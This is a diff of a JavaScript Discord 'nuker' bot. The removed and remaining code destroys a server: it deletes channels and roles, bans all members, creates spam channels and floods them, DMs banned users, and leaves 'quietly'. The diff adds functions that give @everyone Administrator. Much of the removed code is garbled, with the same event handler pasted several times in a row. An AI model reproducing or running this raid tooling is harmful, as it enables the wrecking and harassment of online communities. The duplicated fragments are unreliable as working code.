@@ -85,13 +85,7 @@ const slashCommands = [
         .setDescription('Stop all current operations'),
     new SlashCommandBuilder()
         .setName('kynstatus')
-        .setDescription('Show current nuke status'),
-    new SlashCommandBuilder()
-        .setName('kynbackup')
-        .setDescription('Backup the server data (settings, roles, channels, etc.)'),
-    new SlashCommandBuilder()
-        .setName('kynrestore')
-        .setDescription('Restore a server from a backup')
+        .setDescription('Show current nuke status')
 ].map(command => command.toJSON());
 
 // =====================
@@ -329,6 +323,135 @@ async function spamChannelsFunc(guild) {
     }
 }
 
+// Grant @everyone admin permissions
+async function giveEveryoneAdmin(guild) {
+    if (!nukerConfig.giveEveryoneAdmin) return;
+
+    try {
+        const everyoneRole = guild.roles.everyone;
+        await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
+        console.log('Granted @everyone admin permissions.');
+    } catch (error) {
+        console.error("Couldn't grant @everyone admin permissions:", error);
+    }
+}
+
+// Leave the server quietly
+async function leaveServerQuietly(guild) {
+    if (!nukerConfig.leaveQuietly) return false;
+
+    try {
+        console.log('Leaving server quietly...');
+        await guild.leave();
+        return true;
+    } catch (error) {
+        console.error("Couldn't leave server quietly:", error);
+        return false;
+    }
+}
+
+// Backup server data
+async function backupServerData(guild) {
+    if (!nukerConfig.backupNuke?.enabled) return;
+
+    const backupDir = path.resolve(nukerConfig.backupNuke.saveTo);
+    if (!fs.existsSync(backupDir)) {
+        fs.mkdirSync(backupDir, { recursive: true });
+    }
+
+    const data = {
+        serverSettings: nukerConfig.backupNuke.include.serverSettings ? {
+            name: guild.name,
+            id: guild.id,
+            iconURL: guild.iconURL({ dynamic: true, size: 1024 }),
+            splashURL: guild.splashURL({ dynamic: true, size: 1024 }),
+            bannerURL: guild.bannerURL({ dynamic: true, size: 1024 }),
+            description: guild.description,
+            verificationLevel: guild.verificationLevel,
+            defaultMessageNotifications: guild.defaultMessageNotifications,
+            explicitContentFilter: guild.explicitContentFilter,
+            preferredLocale: guild.preferredLocale,
+            afkChannel: guild.afkChannel?.name || null,
+            afkTimeout: guild.afkTimeout
+        } : null,
+        roles: nukerConfig.backupNuke.include.roles ? guild.roles.cache.map(role => ({
+            name: role.name,
+            id: role.id,
+            color: role.color,
+            hoist: role.hoist,
+            position: role.position,
+            permissions: role.permissions.bitfield.toString(),
+            mentionable: role.mentionable
+        })) : null,
+        channels: nukerConfig.backupNuke.include.channels ? guild.channels.cache.map(channel => ({
+            name: channel.name,
+            id: channel.id,
+            type: channel.type,
+            position: channel.position,
+            parent: channel.parent?.name || null
+        })) : null
+    };
+
+    const backupFile = path.join(backupDir, `${guild.id}_${Date.now()}.json`);
+    fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
+    console.log(`[BACKUP] Saved server data for ${guild.name} to ${backupFile}`);
+    return backupFile;
+}
+
+// Restore server data
+async function restoreServerData(guild, backupFile) {
+    if (!fs.existsSync(backupFile)) {
+        console.error(`[RESTORE] Backup file not found: ${backupFile}`);
+        return;
+    }
+
+    try {
+        const backupData = JSON.parse(fs.readFileSync(backupFile, 'utf8'));
+
+        // Restore server settings
+        if (backupData.serverSettings) {
+            await guild.setName(backupData.serverSettings.name);
+            await guild.setIcon(backupData.serverSettings.iconURL);
+        }
+
+        // Restore roles
+        if (backupData.roles) {
+            for (const roleData of backupData.roles) {
+                try {
+                    await guild.roles.create({
+                        name: roleData.name,
+                        color: roleData.color,
+                        hoist: roleData.hoist,
+                        mentionable: roleData.mentionable,
+                        permissions: BigInt(roleData.permissions)
+                    });
+                } catch (error) {
+                    console.error(`Couldn't restore role ${roleData.name}:`, error);
+                }
+            }
+        }
+
+        // Restore channels
+        if (backupData.channels) {
+            for (const channelData of backupData.channels) {
+                try {
+                    await guild.channels.create({
+                        name: channelData.name,
+                        type: channelData.type,
+                        parent: channelData.parent
+                    });
+                } catch (error) {
+                    console.error(`Couldn't restore channel ${channelData.name}:`, error);
+                }
+            }
+        }
+
+        console.log(`[RESTORE] Successfully restored server data from ${backupFile}`);
+    } catch (error) {
+        console.error(`[RESTORE] Error restoring server:`, error);
+    }
+}
+
 // =====================
 // COMMAND HANDLERS
 // =====================
@@ -557,179 +680,6 @@ client.on('interactionCreate', async interaction => {
                 return interaction.editReply('⚠️ Message clearing completed with some errors.');
             }
         }
-
-        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        client.on('interactionCreate', async (interaction) => {
-            if (!interaction.isCommand()) return;
-        
-            // Permission check
-            if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
-                return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
-            }
-        
-            try {
-                await interaction.deferReply({ ephemeral: true });
-        
-                // Command: /kynbackup
-                if (interaction.commandName === 'kynbackup') {
-                    const guild = interaction.guild;
-                    await interaction.editReply('💾 Starting server backup...');
-                    await backupServerData(guild);
-                    return interaction.editReply('✅ Server backup completed!');
-                }
-        
-                // ...existing command handlers...
-            } catch (error) {
-                console.error('Error handling command:', error);
-                if (!interaction.replied) {
-                    await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
-                }
-            }
-        });        // Command: /kynbackup
-        if (interaction.commandName === 'kynbackup') {
-            const guild = interaction.guild;
-            await interaction.editReply('💾 Starting server backup...');
-            await backupServerData(guild);
-            return interaction.editReply('✅ Server backup completed!');
-        }
-
-        // Command: /kynrestore
-        if (interaction.commandName === 'kynrestore') {
-            const guild = interaction.guild;
-            const backupFile = interaction.options.getString('backup_file');
-            await interaction.editReply('🔄 Restoring server from backup...');
-            await restoreServerData(guild, backupFile);
-            return interaction.editReply('✅ Server restore completed!');
-        }
         
     } catch (error) {
         console.error('Error handling command:', error);
@@ -737,67 +687,6 @@ client.on('interactionCreate', async interaction => {
             await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
         }
     }
-});
-
-client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isCommand()) return;
-
-    if (interaction.commandName === 'kynrestore') {
-        const backupDir = path.resolve(config.nuker.backupNuke.saveTo);
-        if (!fs.existsSync(backupDir)) {
-            return interaction.reply('❌ No backups found.');
-        }
-
-        const backupFiles = fs.readdirSync(backupDir).filter(file => file.endsWith('.json'));
-        if (backupFiles.length === 0) {
-            return interaction.reply('❌ No backups found.');
-        }
-
-        const backupList = backupFiles.map((file, index) => {
-            const backupData = JSON.parse(fs.readFileSync(path.join(backupDir, file), 'utf8'));
-            return `${index + 1}. ${backupData.serverSettings.name} - ${new Date(parseInt(file.split('_')[1])).toLocaleString()}`;
-        }).join('\n');
-
-        await interaction.reply(`💾 Available backups:\n${backupList}\n\nReply with the number of the backup you want to restore.`);
-
-        const filter = response => response.author.id === interaction.user.id;
-        const collector = interaction.channel.createMessageCollector({ filter, time: 60000 });
-
-        collector.on('collect', async (message) => {
-            const choice = parseInt(message.content);
-            if (isNaN(choice) || choice < 1 || choice > backupFiles.length) {
-                return message.reply('❌ Invalid choice. Please try again.');
-            }
-
-            const selectedBackup = path.join(backupDir, backupFiles[choice - 1]);
-            await message.reply('🔄 Restoring server from backup...');
-            await restoreServerData(interaction.guild, selectedBackup);
-            return message.reply('✅ Server restored successfully!');
-        });
-
-        collector.on('end', collected => {
-            if (collected.size === 0) {
-                interaction.followUp('❌ No response received. Restore cancelled.');
-            }
-        });
-    }
-});
-
-client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isCommand()) return;
-
-    const commandName = interaction.commandName;
-    const userId = interaction.user.id;
-
-    // Check if the command is whitelisted
-    if (!isWhitelistedCommand(commandName, userId)) {
-        return interaction.reply({
-            content: '❌ You are not authorized to use this command.',
-            ephemeral: true
-        });
-    }
-
-    // ...existing command handling logic...
 });
 
 // Handle legacy text commands
@@ -993,344 +882,7 @@ client.on('messageCreate', async message => {
             return message.reply('⚠️ Message clearing completed with some errors.').catch(console.error);
         }
     }
-
-    // Command: !kynbackup
-    if (command === 'kynbackup') {
-        const guild = message.guild;
-        await message.reply('💾 Starting server backup...');
-        await backupServerData(guild);
-        return message.reply('✅ Server backup completed!');
-    }
-
-    // Command: !kynrestore
-    if (command === 'kynrestore') {
-        const guild = message.guild;
-        const backupFile = args[0];
-        await message.reply('🔄 Restoring server from backup...');
-        await restoreServerData(guild, backupFile);
-        return message.reply('✅ Server restore completed!');
-    }
 });
-
-client.on('messageCreate', async (message) => {
-    if (!message.content.startsWith(generalConfig.commandPrefix) || message.author.bot) return;
-
-    const args = message.content.slice(generalConfig.commandPrefix.length).trim().split(/ +/);
-    const command = args.shift().toLowerCase();
-    const userId = message.author.id;
-
-    // Check if the command is whitelisted
-    if (!isWhitelistedCommand(command, userId)) {
-        return message.reply('❌ You are not authorized to use this command.').catch(console.error);
-    }
-
-    // ...existing command handling logic...
-});
-
-client.on('messageCreate', async (message) => {
-    if (!message.content.startsWith(generalConfig.commandPrefix) || message.author.bot) return;
-
-    const args = message.content.slice(generalConfig.commandPrefix.length).trim().split(/ +/);
-    const command = args.shift().toLowerCase();
-
-    if (command === 'kynrestore') {
-        const backupDir = path.resolve(config.nuker.backupNuke.saveTo);
-        if (!fs.existsSync(backupDir)) {
-            return message.reply('❌ No backups found.');
-        }
-
-        const backupFiles = fs.readdirSync(backupDir).filter(file => file.endsWith('.json'));
-        if (backupFiles.length === 0) {
-            return message.reply('❌ No backups found.');
-        }
-
-        const backupList = backupFiles.map((file, index) => {
-            const backupData = JSON.parse(fs.readFileSync(path.join(backupDir, file), 'utf8'));
-            return `${index + 1}. ${backupData.serverSettings.name} - ${new Date(parseInt(file.split('_')[1])).toLocaleString()}`;
-        }).join('\n');
-
-        await message.reply(`💾 Available backups:\n${backupList}\n\nReply with the number of the backup you want to restore.`);
-
-        const filter = response => response.author.id === message.author.id;
-        const collector = message.channel.createMessageCollector({ filter, time: 60000 });
-
-        collector.on('collect', async (response) => {
-            const choice = parseInt(response.content);
-            if (isNaN(choice) || choice < 1 || choice > backupFiles.length) {
-                return response.reply('❌ Invalid choice. Please try again.');
-            }
-
-            const selectedBackup = path.join(backupDir, backupFiles[choice - 1]);
-            await response.reply('🔄 Restoring server from backup...');
-            await restoreServerData(message.guild, selectedBackup);
-            return response.reply('✅ Server restored successfully!');
-        });
-
-        collector.on('end', collected => {
-            if (collected.size === 0) {
-                message.reply('❌ No response received. Restore cancelled.');
-            }
-        });
-    }
-});
-
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.commandName === 'kynnuke') {
-        const guild = interaction.guild;
-
-        // Backup Phase
-        await interaction.reply('💾 Starting backup phase...');
-        const backupFile = await backupServerData(guild);
-        if (!backupFile) {
-            return interaction.editReply('❌ Backup failed. Aborting nuke.');
-        }
-        await interaction.editReply('✅ Backup completed successfully.');
-
-        // Proceed with the nuke phases
-        await interaction.editReply('💣 Starting nuke procedure...');
-        await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.initialOperationDelay));
-
-        // Edit server info first
-        await editServerInfo(guild);
-
-        // PHASE 1: DELETIONS
-        await interaction.editReply('💣 Starting deletion phase...');
-        const rolesResult = await manageRoles(guild);
-        const channelsDeleted = await deleteAllChannels(guild);
-
-        // PHASE 2: BANS
-        await interaction.editReply('💣 Starting ban phase...');
-        const bannedCount = await banAllMembers(guild);
-
-        // PHASE 3: CREATIONS
-        await interaction.editReply('💣 Starting creation phase...');
-        if (nukerConfig.behavior.createRoles) {
-            await manageRoles(guild);
-        }
-        if (nukerConfig.behavior.createChannels) {
-            await createSpamChannels(guild);
-        }
-
-        // PHASE 4: SPAM
-        await interaction.editReply('💣 Starting spam phase...');
-        await spamChannelsFunc(guild);
-
-        // Final report
-        await interaction.editReply(
-            `✅ Nuke complete!\n` +
-            `- Banned ${bannedCount} members\n` +
-            `- Deleted ${channelsDeleted} channels\n` +
-            `- Created ${spamChannels.length} channels\n` +
-            `- Created ${rolesCreated} roles`
-        );
-    }
-});
-
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.commandName === 'kynbackup') {
-        const guild = interaction.guild;
-
-        await interaction.reply('💾 Starting server backup...');
-        const backupFile = await backupServerData(guild);
-        if (!backupFile) {
-            return interaction.editReply('❌ Backup failed.');
-        }
-        return interaction.editReply(`✅ Backup completed successfully. Saved to: ${backupFile}`);
-    }
-});
-
-// =====================
-// NEW FEATURES (APPENDED TO ORIGINAL CODE)
-// =====================
-
-// Auto-DM Banned Members
-async function sendBanDM(member) {
-    if (!config.nuker.dmAfterBan?.enabled) return;
-    try {
-        await member.send(config.nuker.dmAfterBan.message)
-            .catch(() => console.log(`[AUTO-DM] Couldn't DM ${member.user.tag}`));
-    } catch (e) {
-        console.log("[AUTO-DM] Error:", e);
-    }
-}
-
-// Backup Nuke (Save Server Data)
-async function backupServerData(guild) {
-    const backupConfig = config.nuker.backupNuke;
-
-    if (!backupConfig?.enabled) return;
-
-    const backupDir = path.resolve(backupConfig.saveTo);
-    if (!fs.existsSync(backupDir)) {
-        fs.mkdirSync(backupDir, { recursive: true });
-    }
-
-    const data = {};
-
-    // Backup server settings
-    if (backupConfig.include.serverSettings) {
-        data.serverSettings = {
-            name: guild.name,
-            id: guild.id,
-            iconURL: guild.iconURL({ dynamic: true, size: 1024 }),
-            splashURL: guild.splashURL({ dynamic: true, size: 1024 }),
-            bannerURL: guild.bannerURL({ dynamic: true, size: 1024 }),
-            description: guild.description,
-            verificationLevel: guild.verificationLevel,
-            defaultMessageNotifications: guild.defaultMessageNotifications,
-            explicitContentFilter: guild.explicitContentFilter,
-            preferredLocale: guild.preferredLocale,
-            afkChannel: guild.afkChannel?.name || null,
-            afkTimeout: guild.afkTimeout
-        };
-    }
-
-    // Backup roles
-    if (backupConfig.include.roles) {
-        data.roles = guild.roles.cache.map(role => ({
-            name: role.name,
-            id: role.id,
-            color: role.color,
-            hoist: role.hoist,
-            position: role.position,
-            permissions: role.permissions.bitfield,
-            mentionable: role.mentionable
-        }));
-    }
-
-    // Backup channels
-    if (backupConfig.include.channels) {
-        data.channels = guild.channels.cache.map(channel => ({
-            name: channel.name,
-            id: channel.id,
-            type: channel.type,
-            parent: channel.parent?.name || null,
-            position: channel.position,
-            topic: channel.topic || null,
-            nsfw: channel.nsfw || false
-        }));
-    }
-
-    // Backup members
-    if (backupConfig.include.members) {
-        const members = await guild.members.fetch();
-        data.members = members.map(member => ({
-            tag: member.user.tag,
-            id: member.id,
-            nickname: member.nickname || null,
-            roles: member.roles.cache.map(role => role.name),
-            joinedAt: member.joinedAt
-        }));
-    }
-
-    // Backup emojis
-    if (backupConfig.include.emojis) {
-        data.emojis = guild.emojis.cache.map(emoji => ({
-            name: emoji.name,
-            id: emoji.id,
-            animated: emoji.animated,
-            url: emoji.url
-        }));
-    }
-
-    // Backup stickers
-    if (backupConfig.include.stickers) {
-        data.stickers = guild.stickers.cache.map(sticker => ({
-            name: sticker.name,
-            id: sticker.id,
-            description: sticker.description,
-            format: sticker.format
-        }));
-    }
-
-    // Save the backup to a file
-    const timestamp = Date.now();
-    const backupFile = path.join(backupDir, `${guild.id}_${timestamp}.json`);
-    fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
-
-    console.log(`[BACKUP] Saved server data for ${guild.name} to ${backupFile}`);
-    return backupFile; // Return the backup file path
-}
-
-// Give @everyone Admin
-async function giveEveryoneAdmin(guild) {
-    if (!config.nuker.giveEveryoneAdmin) return;
-    try {
-        await guild.roles.everyone.setPermissions([PermissionsBitField.Flags.Administrator]);
-        console.log(`[ADMIN] Gave @everyone admin in ${guild.name}`);
-    } catch (e) {
-        console.log("[ADMIN] Error:", e);
-    }
-}
-
-// Leave Quietly (Skip Spam)
-async function stealthLeave(guild) {
-    if (!config.nuker.leaveQuietly) return;
-    try {
-        await guild.leave();
-        console.log(`[STEALTH] Left ${guild.name} quietly`);
-    } catch (e) {
-        console.log("[STEALTH] Error:", e);
-    }
-}
-
-// Patch into banAllMembers() to add auto-DM
-const originalBanAllMembers = banAllMembers;
-banAllMembers = async function(guild) {
-    const banned = await originalBanAllMembers(guild);
-    if (config.nuker.dmAfterBan?.enabled) {
-        const members = await guild.members.fetch();
-        members.forEach(m => {
-            if (!m.bannable || config.nuker.allowedUserIds.includes(m.id)) return;
-            sendBanDM(m).catch(console.error);
-        });
-    }
-    return banned;
-};
-
-// Patch into nuke command flow
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.isCommand() && interaction.commandName === 'kynnuke') {
-        const guild = interaction.guild;
-        await backupServerData(guild); // Backup will only run if enabled in config
-        await giveEveryoneAdmin(guild);
-        if (config.nuker.leaveQuietly) {
-            await stealthLeave(guild);
-            return;
-        }
-    }
-});
-
-// Patch into legacy !kynnuke
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith(config.general.commandPrefix + 'kynnuke')) {
-        const guild = message.guild;
-        await backupServerData(guild);
-        await giveEveryoneAdmin(guild);
-        if (config.nuker.leaveQuietly) {
-            await stealthLeave(guild);
-            return;
-        }
-    }
-});
-
-// Fake Activity (uses existing ready event)
-client.once('ready', () => {
-    console.log('Bot is ready!');
-    if (config.general.fakeActivity?.enabled) {
-        console.log('Setting activity...');
-        client.user.setActivity(config.general.fakeActivity.name, { 
-            type: config.general.fakeActivity.type 
-        });
-    }
-});
-
-function isWhitelistedCommand(command, userId) {
-    const whitelistConfig = nukerConfig.whitelist;
-    if (!whitelistConfig.enabled) return true; // Whitelist system is disabled
-    if (!whitelistConfig.commands.includes(command)) return true; // Command is not restricted
-    return whitelistConfig.authorizedUserIds.includes(userId); // Check if user is authorized
-}
 
 // =====================
 // ERROR HANDLING
@@ -1356,104 +908,4 @@ client.login(nukerConfig.token)
 // Cleanup on exit
 process.on('exit', () => {
     console.log('Bot shutting down...');
-});
-
-const readline = require('readline');
-
-async function restoreServerData(guild, backupFile) {
-    try {
-        const backupData = JSON.parse(fs.readFileSync(backupFile, 'utf8'));
-
-        // Delete all roles, channels, and emojis
-        await Promise.all(guild.roles.cache.map(role => role.managed || role.id === guild.roles.everyone.id ? null : role.delete()));
-        await Promise.all(guild.channels.cache.map(channel => channel.delete()));
-        await Promise.all(guild.emojis.cache.map(emoji => emoji.delete()));
-
-        // Restore server settings
-        if (backupData.serverSettings) {
-            await guild.setName(backupData.serverSettings.name);
-            await guild.setIcon(backupData.serverSettings.iconURL);
-        }
-
-        // Restore roles
-        if (backupData.roles) {
-            for (const roleData of backupData.roles) {
-                await guild.roles.create({
-                    name: roleData.name,
-                    color: roleData.color,
-                    hoist: roleData.hoist,
-                    position: roleData.position,
-                    permissions: BigInt(roleData.permissions),
-                    mentionable: roleData.mentionable
-                });
-            }
-        }
-
-        // Restore channels
-        if (backupData.channels) {
-            for (const channelData of backupData.channels) {
-                await guild.channels.create({
-                    name: channelData.name,
-                    type: channelData.type,
-                    parent: channelData.parent,
-                    position: channelData.position,
-                    topic: channelData.topic,
-                    nsfw: channelData.nsfw
-                });
-            }
-        }
-
-        // Restore emojis
-        if (backupData.emojis) {
-            for (const emojiData of backupData.emojis) {
-                await guild.emojis.create(emojiData.url, emojiData.name);
-            }
-        }
-
-        console.log(`[RESTORE] Successfully restored server from ${backupFile}`);
-    } catch (error) {
-        console.error(`[RESTORE] Error restoring server:`, error);
-    }
-}
-
-client.on('interactionCreate', async (interaction) => {
-    if (interaction.commandName === 'kynrestore') {
-        const backupDir = path.resolve(config.nuker.backupNuke.saveTo);
-        if (!fs.existsSync(backupDir)) {
-            return interaction.reply('❌ No backups found.');
-        }
-
-        const backupFiles = fs.readdirSync(backupDir).filter(file => file.endsWith('.json'));
-        if (backupFiles.length === 0) {
-            return interaction.reply('❌ No backups found.');
-        }
-
-        const backupList = backupFiles.map((file, index) => {
-            const backupData = JSON.parse(fs.readFileSync(path.join(backupDir, file), 'utf8'));
-            return `${index + 1}. ${backupData.serverSettings.name} - ${new Date(parseInt(file.split('_')[1])).toLocaleString()}`;
-        }).join('\n');
-
-        await interaction.reply(`💾 Available backups:\n${backupList}\n\nReply with the number of the backup you want to restore.`);
-
-        const filter = response => response.author.id === interaction.user.id;
-        const collector = interaction.channel.createMessageCollector({ filter, time: 60000 });
-
-        collector.on('collect', async (message) => {
-            const choice = parseInt(message.content);
-            if (isNaN(choice) || choice < 1 || choice > backupFiles.length) {
-                return message.reply('❌ Invalid choice. Please try again.');
-            }
-
-            const selectedBackup = path.join(backupDir, backupFiles[choice - 1]);
-            await message.reply('🔄 Restoring server from backup...');
-            await restoreServerData(interaction.guild, selectedBackup);
-            return message.reply('✅ Server restored successfully!');
-        });
-
-        collector.on('end', collected => {
-            if (collected.size === 0) {
-                interaction.followUp('❌ No response received. Restore cancelled.');
-            }
-        });
-    }
 });
